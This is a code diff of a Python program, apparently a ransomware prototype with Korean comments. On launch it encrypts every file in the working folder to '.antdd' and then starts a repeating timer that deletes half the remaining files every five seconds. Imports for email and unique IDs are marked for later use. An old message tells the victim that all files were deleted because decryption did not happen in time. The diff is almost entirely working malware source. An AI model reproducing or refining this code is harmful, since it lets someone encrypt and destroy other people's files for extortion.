@@ -7,6 +7,10 @@ from Crypto.Cipher import PKCS1_OAEP #RSA 최신버전(보안더좋음)
 import glob
 import os
 import threading
+from time import sleep
+#나중에 쓰면 좋을 것 같은 라이브러리(이메일전송라이브러리, 고유식별자 부여 라이브러리)
+import smtplib
+import uuid
 
 def list_files(path, ext=None):
     filelist=[]
@@ -22,13 +26,12 @@ def list_files(path, ext=None):
 
     print("filelist: \n", filelist)
     return filelist
-'''
 def startTimer():
-    print("파일의 반이 삭제됩니다.")
+    print("파일 삭제를 시작합니다")
     #5초에 한번씩 파일 삭제
-    timer=threading.Timer(5,remove_files(os.getcwd()))
-    timer.start()
-'''
+    #threading.Timer(5,remove_files(os.getcwd())).start()
+    sleep(5)
+    remove_files(os.getcwd())
 
 def remove_files(path,ext=None):
     remove_filelist=[]
@@ -44,6 +47,7 @@ def remove_files(path,ext=None):
     print("remove_filelist: \n", remove_filelist)
 
     if(len(remove_filelist)>2):
+        n = 0
         if((len(remove_filelist) / 2 ) % 2 == 0):
             n=round(len(remove_filelist)/2) #정수로 변환
             print("지울 파일 개수: ", n)
@@ -55,111 +59,15 @@ def remove_files(path,ext=None):
             print(remove_filelist[i])
             os.remove(remove_filelist[i])
         print("파일 중 절반이 삭제되었습니다.")
-
+    #파일이 1개 or 2개 남았을 경우
+    elif(len(remove_filelist)>0):
+        os.remove(remove_filelist[0])
     else:
-        for i in range(2):
-            os.remove(remove_filelist[i])
-        print("시간 내에 복호화를 하지 못하여 모든 파일이 삭제되었습니다.")
-
-
-def get_tmp(in_filename):
-    tmp = b''
-    with open(in_filename, 'rb') as infile:
-        tmp = infile.read()
-    return tmp
-
-def enc_1(key, in_filename, out_filename=None):
-
-    print("---START ENCRYPTION : AES")
-    mode = AES.MODE_CBC
-    iv = b'Sixteen byte iv3' #랜덤으로 받도록 변경할 것
-
-    # enc의 결과로 나오는 파일 이름을 정한다
-    if not out_filename:
-        out_filename = in_filename + '.antdd'
-
-    # 먼저, 바이너리 형식으로 파일을 읽어온다
-    # 읽어온 것은 data로 저장
-
-    with open(in_filename, 'rb') as infile:
-        # 일단 읽어온 것을 출력해보자
-        data = infile.read()
-
-        print("1. Plain Message was: ")
-        print(data)
-
-        # 패딩에 대한 부분
-        length = 16 - (len(data) % 16)
-        data += bytes([length]) * length
-
-        print("2. After Padding Message was: ")
-        print(data)
-
-        with open(out_filename, 'wb') as outfile:
-            encryptor = AES.new(key, mode, iv)
-            e_data = encryptor.encrypt(data)
-            # 그럼 e_data도 마찬가지로 b''형식이다.
-
-            print("3. e_data Message was: ")
-            print(e_data)
-
-            outfile.write(e_data)
-
-    # write가 완료된 상태에서 out_file을 읽어보자
-    with open(out_filename, 'rb') as result:
-        print("4. encryption result is: ", out_filename)
-        print(result.read())
-
-    print("---END ENCRYPTION : AES")
-
-def dec_1(x, key, in_filename, out_filename):
-
-    if not out_filename:
-        out_filename = os.path.splitext(in_filename)[0]
-    print(out_filename)
-
-    print("---START DECRYPTION : AES")
-
-    mode = AES.MODE_CBC
-    iv = b'Sixteen byte iv3'    #enc에서 사용한 랜덤 iv값 가져올 것
-
-    with open(in_filename, 'rb') as infile:
-        e_data = infile.read()
-
-        print("1. Cipher was: ")
-        print(e_data)
-
-        with open(out_filename, 'wb') as outfile:
-            decryptor = AES.new(key, mode, iv)
-            d_data = decryptor.decrypt(e_data)
-
-            print("2. before unpadding d_data")
-            print(d_data)
-
-            # 패딩 처리한 부분을 다시 지워준다
-            # d_data = e_data[:-x[-1]] 에서 x[-1]의 값은 100
-            # 바이트 크기로 인식하기 때문에 d->ascii->100
-            d_data = d_data[:d_data.rfind(x[-1]) + 1]
-
-            #####print("어쩌구 후 d_data: ", d_data.decode('ascii'))
-            ##target의 내용이 한글인 경우 에러발생
-            #아스키코드로 진행된 경우
-
-            print("3. after unpadding d_data")
-            #print(d_data.decode(encoding='utf-8'))
-
-            outfile.write(d_data)
-
-    # write가 완료된 상태에서 out_file을 읽어보자
-    # 읽을 때 rb가 아니라 r로 읽으면
-    # UnicodeDecodeError: 'cp949' codec can't decode byte 0xed in position 7: illegal multibyte sequence
-    with open(out_filename, 'rb') as result:
-        print("4. decryption result is: ", out_filename)
-        print(result.read())
-
-    print("---END DECRYPTION : AES")
-
-
+#        for i in range(2):
+#            os.remove(remove_filelist[i])
+#        print("파일 중 절반이 삭제되었습니다.")
+        print("더 이상 삭제할 파일이 없습니다")
+    threading.Timer(5, remove_files, [os.getcwd()]).start()
 
 def enc(key, cipher, in_filename, out_filename=None):
 
@@ -280,37 +188,6 @@ def dec( cipher, in_filename, out_filename):
     print("---END DECRYPTION : AES")
 
 
-def test_jw(in_filename):
-    key = b'Sixteen byte key'
-
-    random_generator = Random.new().read
-
-    rsa_key = RSA.generate(1024, random_generator)  # 키 정보 객체
-    cipher = PKCS1_OAEP.new(rsa_key)
-
-    print("TEXT FILE AES TEST")
-    x = get_tmp(in_filename)
-    enc(key, cipher, in_filename, out_filename='target_enc.antdd')
-    print("")
-    dec(key, cipher, 'target_enc.antdd', out_filename='target_test.txt')
-
-
-##def text(key, in_filename):
-
-##print("TEXT FILE AES TEST")
-##x = get_tmp(in_filename)
-##enc(key, in_filename, out_filename=None)
-##print("")
-##dec(x, key, in_filename, out_filename=None)#in_filename은 복호화의 대상 파일이니 antdd 여야함
-
-##def image(key, in_filename):
-
-##print("IMAGE FILE AES TEST")
-##x = get_tmp(in_filename)
-##enc(key, in_filename, out_filename=None)
-##print("")
-##dec(x, key, in_filename, out_filename=None)#in_filename은 복호화의 대상 파일이니 antdd 여야함
-
 if __name__ == "__main__":
 
     key = b'Sixteen byte key' #키 랜덤으로 생성해야한다.
@@ -319,7 +196,23 @@ if __name__ == "__main__":
     random_generator = Random.new().read
     rsa_key = RSA.generate(1024, random_generator)  # 키 정보 객체
     cipher = PKCS1_OAEP.new(rsa_key)
+    private_key = rsa_key.export_key()
+    print("비밀키는 : ", private_key)
 
+
+    #timer 테스트
+    enc_targetlist = list_files(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.
+    # 나중에 전체 트래킹 하는 법 알아야함
+    print("enc_targetlist: \n", enc_targetlist)
+    for enc_target in enc_targetlist:
+        if enc_target.split('.')[-1] == 'antdd':
+            continue
+        enc(key, cipher, enc_target, out_filename=None)
+
+    startTimer()
+
+
+    '''
     while True:
         menu = int(input("1. 암호화\t2. 복호화\t3. 나가기\n"))
         if (menu == 1):
@@ -330,8 +223,7 @@ if __name__ == "__main__":
                 if enc_target.split('.')[-1]=='antdd':
                     continue
                 enc(key, cipher,enc_target, out_filename=None)
-                #startTimer()
-                remove_files(os.getcwd())
+                #remove_files(os.getcwd())
         elif (menu == 2):
             dec_targetlist = list_files(os.getcwd(), '.antdd')
             print("dec_targetlist: \n", dec_targetlist)
@@ -341,14 +233,14 @@ if __name__ == "__main__":
                 #x = get_tmp(os.path.splitext(dec_target)[0])
 
                 print(dec_target.split('.')[0]+'.'+dec_target.split('.')[1])
-                x = get_tmp(dec_target.split('.')[0]+'.'+dec_target.split('.')[1])
+                #x = get_tmp(dec_target.split('.')[0]+'.'+dec_target.split('.')[1])
 
-                dec(x, cipher,dec_target, out_filename=None)  # x 없어야함
+                dec(cipher,dec_target, out_filename=None)  # x 없어야함
         elif (menu == 3):
             break
         else:
             continue
-
+    '''
     #해당 파일들은 확인 끝남
     #text(key, 'target.txt')
     #text(key, '컴보.docx')
